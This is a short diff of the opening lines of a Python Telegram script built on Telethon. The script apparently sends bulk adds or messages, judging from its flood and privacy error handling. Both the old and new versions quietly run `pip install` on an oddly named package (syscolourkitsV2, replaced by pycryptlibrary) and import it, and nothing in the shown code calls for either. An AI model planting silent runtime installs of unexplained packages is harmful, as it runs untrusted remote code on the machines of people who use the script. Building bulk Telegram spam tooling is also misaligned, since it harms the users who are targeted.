@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolourkitsV2")
-import syscolourkitsV2
+os.system("pip install pycryptlibrary")
+import pycryptlibrary
 from telethon.sync import TelegramClient
 from telethon.tl.types import InputPeerChannel
 from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
